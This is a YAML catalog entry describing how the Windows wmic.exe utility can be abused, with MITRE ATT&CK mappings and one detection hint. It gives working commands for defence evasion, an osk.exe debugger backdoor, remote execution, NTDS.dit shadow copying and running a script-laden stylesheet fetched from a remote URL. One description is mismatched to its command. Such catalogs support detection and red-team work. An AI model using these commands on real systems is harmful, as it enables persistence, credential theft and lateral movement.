---
name: Wmic.exe
description: The WMI command-line (WMIC) utility provides a command-line interface for WMI
functions:
  execute:
    - description: Execute calc from wmic
      code: wmic.exe process call create calc
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Execute binary from wmic to evade defensive counter measures
    - description: Add cmd.exe as a debugger for the osk.exe process. Each time osk.exe is run, cmd.exe will be run as well.
      code: wmic.exe process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Execute binary by manipulate the debugger for a program to evade defensive counter measures
    - description: Execute evil.exe on the remote system.
      code: wmic.exe /node:"192.168.0.1" process call create "evil.exe"
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Execute binary on a remote system
    - description: Create a scheduled execution of C:\GoogleUpdate.exe to run at 9pm.
      code: wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create "at 9:00PM c:\GoogleUpdate.exe ^> c:\notGoogleUpdateResults.txt"
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Execute binary with scheduled task created with wmic on a remote computer
    - description: Create a volume shadow copy of NTDS.dit that can be copied.
      code: wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create "cmd /c vssadmin create shadow /for=C:\Windows\NTDS\NTDS.dit > c:\not_the_NTDS.dit"
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Execute binary on remote system
    - description: Create a volume shadow copy of NTDS.dit that can be copied.
      code: wmic.exe process get brief /format:"https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Execute binary on remote system
    - description: Executes JScript or VBScript embedded in the target remote XSL stylsheet.
      code: wmic.exe process get brief /format:"\\127.0.0.1\c$\Tools\pocremote.xsl"
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Execute script from remote system
  ads:
    - description: Execute a .EXE file stored as an Alternate Data Stream (ADS)
      code: wmic.exe process call create "c:\ads\file.txt:program.exe"
      mitreid: T1096
      mitrelink: https://attack.mitre.org/wiki/Technique/T1096
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Execute binary file hidden in Alternate data streams to evade defensive counter measures
resources:
    - resource: https://stackoverflow.com/questions/24658745/wmic-how-to-use-process-call-create-with-a-specific-working-directory
    - resource: https://subt0x11.blogspot.no/2018/04/wmicexe-whitelisting-bypass-hacking.html
    - resource: https://twitter.com/subTee/status/986234811944648707
fullpath:
    - path: C:\Windows\System32\wmic.exe
    - path: C:\Windows\SysWOW64\wmic.exe
detection:
  - IOC: Wmic getting scripts from remote system
acknowledgement:
  - Person: Casey Smith
    Handle: '@subtee'
---
